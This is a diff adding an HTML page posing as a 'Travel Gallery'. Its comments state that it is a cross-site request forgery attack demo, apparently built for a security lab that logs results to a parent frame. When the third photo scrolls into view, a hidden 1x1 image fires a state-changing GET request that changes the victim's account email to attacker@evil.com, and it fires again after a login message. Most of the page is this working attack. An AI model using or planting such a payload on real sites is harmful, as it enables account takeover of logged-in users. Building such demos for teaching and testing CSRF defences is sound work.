@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Travel Gallery</title>
+  <style>
+    body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;margin:24px 18px;line-height:1.45}
+    .hint{position:sticky;top:0;background:#fffbe6;border:1px solid #fde68a;color:#92400e;border-radius:8px;padding:10px;margin-bottom:14px}
+    .photo{margin:18px 0;border:1px solid #e5e7eb;border-radius:10px;padding:10px;background:#fafafa}
+    img{max-width:100%;border-radius:8px;display:block}
+    .muted{color:#666;font-size:13px;margin-top:6px}
+  </style>
+</head>
+<body>
+  <!-- Fixed hint bar; user is told to just scroll -->
+  <div class="hint">No clicks needed — just scroll and look at the photos.</div>
+
+  <!-- Photo 1 (benign) -->
+  <div class="photo">
+    <img src="../../assets/ucc1.jpg" alt="1">
+    <div class="muted">1 — campus</div>
+  </div>
+
+  <!-- Photo 2 (benign) -->
+  <div class="photo">
+    <img src="../../assets/library.jpg" alt="2">
+    <div class="muted">2 — library</div>
+  </div>
+
+  <!-- Photo 3: entering the viewport will trigger the attack -->
+  <div class="photo" id="evilBlock">
+    <img id="teaser" src="../../assets/image.png" alt="teaser (safe preview)" loading="lazy">
+    <div class="muted">3 — teaser (just look)</div>
+  </div>
+
+  <!-- Hidden container that will receive the 1x1 payload image -->
+  <div id="payloadHolder" hidden></div>
+
+  <script>
+    // Cache key elements
+    const holder = document.getElementById('payloadHolder');
+    const block  = document.getElementById('evilBlock');
+
+    // State: whether the 3rd photo has been seen and whether payload fired once
+    let seen = false;      // has the 3rd item been visible at least once
+    let delivered = false; // has onload fired (avoid duplicate payloads)
+
+    // Helper: notify parent panel for logging / UI updates
+    function notifyParent(type, value){
+      try { window.parent?.postMessage({type, value}, '*'); } catch(e){}
+    }
+
+    // Fire the GET-based payload once (disguised as an image request)
+    function firePayload() {
+      if (delivered) return;
+
+      // (1) Immediately tell parent the attack was fired; parent may begin short polling as a fallback
+      notifyParent('ATTACK_FIRED', Date.now());
+
+      const img = new Image();
+      img.width = 1;
+      img.height = 1;
+      img.style.opacity = '0.001';
+
+      img.onload = () => {
+        delivered = true;
+        // (2) Normal case: onload indicates request reached the server; report as "attacked"
+        notifyParent('ATTACK_STATUS', 'attacked');
+      };
+
+      img.onerror = () => {
+        // Extreme case: still signal the parent so it can rely on its polling result
+        notifyParent('ATTACK_STATUS', 'maybe');
+      };
+
+      // Target: perform a state-changing GET (e.g., change email) disguised as an image
+      img.src = 'email_image.php?new=attacker%40evil.com&v=' + Date.now(); // cache buster
+      holder.hidden = false;
+      holder.appendChild(img);
+    }
+
+    // IntersectionObserver: when 60% of the 3rd block is in view, simulate a lazy-load delay then fire
+    const io = new IntersectionObserver((entries)=>{
+      entries.forEach(e=>{
+        if (e.isIntersecting) {
+          seen = true;
+          setTimeout(firePayload, 400); // simulate lazy loading delay
+        }
+      });
+    }, {threshold: 0.6});
+    io.observe(block);
+
+    // If parent notifies "just logged in" and the 3rd item is visible but not delivered yet, fire once more
+    window.addEventListener('message', (ev) => {
+      const d = ev.data || {};
+      if (d.type === 'LOGIN_DONE' && seen && !delivered) {
+        firePayload();
+      }
+    });
+  </script>
+</body>
+</html>
